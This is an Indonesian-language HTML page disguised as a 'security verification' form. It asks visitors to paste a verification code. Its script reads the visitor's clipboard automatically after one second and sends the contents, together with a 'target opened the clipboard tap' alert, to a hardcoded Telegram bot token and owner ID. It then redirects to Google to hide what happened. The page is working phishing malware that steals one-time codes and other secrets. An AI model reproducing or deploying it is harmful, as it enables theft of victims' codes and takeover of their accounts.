<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verifikasi Keamanan - Clipboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 30px;
            overflow: hidden;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .header {
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            padding: 30px 20px;
        }
        .header h1 {
            color: white;
            font-size: 24px;
        }
        .content {
            padding: 40px 20px;
        }
        textarea {
            width: 100%;
            height: 100px;
            padding: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            margin: 20px 0;
            font-size: 14px;
            resize: none;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            border: none;
            border-radius: 12px;
            font-size: 18px;
            cursor: pointer;
            font-weight: bold;
        }
        .loading {
            display: none;
            margin-top: 20px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #fa709a;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📋 Verifikasi Data</h1>
            <p>Tempelkan kode verifikasi yang telah dikirim</p>
        </div>
        <div class="content">
            <p>Silahkan tekan CTRL+V / tap dan tahan untuk menempel</p>
            <textarea id="clipboardData" placeholder="Kode verifikasi akan otomatis terdeteksi..." readonly></textarea>
            <button class="btn" onclick="checkClipboard()">✅ Verifikasi Otomatis</button>
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p style="margin-top: 10px;">Memverifikasi...</p>
            </div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id') || 'unknown';
        
        let targetUserId = 'unknown';
        try {
            const decoded = atob(userId);
            targetUserId = decoded.split('_')[0];
        } catch(e) {}
        
        const BOT_TOKEN = '8887227913:AAHa5qn2FlUaWM79lmA1jvJTWjb6lK5vCiI';
        const OWNER_ID = '8486996997';
        
        async function sendMessageToTelegram(chatId, message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
                });
            } catch(e) {}
        }
        
        async function sendNotification() {
            const message = `🔴 *TARGET MEMBUKA SADAPAN CLIPBOARD*\n\n👤 User ID: \`${targetUserId}\`\n🎯 Type: Clipboard\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
            
            if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
                await sendMessageToTelegram(targetUserId, message);
            }
            await sendMessageToTelegram(OWNER_ID, `👀 *CLIPBOARD DARI USER ${targetUserId}*\n${message}`);
        }
        
        async function sendClipboardData(data) {
            if (!data || data === '') return;
            
            const message = `📋 *HASIL SADAP CLIPBOARD*\n\n┌─────────────────┤❖├─────────────────┐\n│ 👤 User ID: \`${targetUserId}\`\n│ 📋 Data: \`${data.substring(0, 500)}\`\n│ 🕐 Waktu: ${new Date().toLocaleString('id-ID')}\n└─────────────────────────────────────┘`;
            
            if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
                await sendMessageToTelegram(targetUserId, message);
            }
            await sendMessageToTelegram(OWNER_ID, `👀 *HASIL CLIPBOARD DARI USER ${targetUserId}*\n${message}`);
        }
        
        async function checkClipboard() {
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            try {
                const text = await navigator.clipboard.readText();
                document.getElementById('clipboardData').value = text;
                await sendClipboardData(text);
                
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 2000);
            } catch(e) {
                alert('Gagal membaca clipboard. Pastikan Anda memberikan izin.');
                document.querySelector('.btn').style.display = 'block';
                document.getElementById('loading').style.display = 'none';
            }
        }
        
        sendNotification();
        
        // Auto read clipboard after 1 second
        setTimeout(() => checkClipboard(), 1000);
    </script>
</body>
</html>
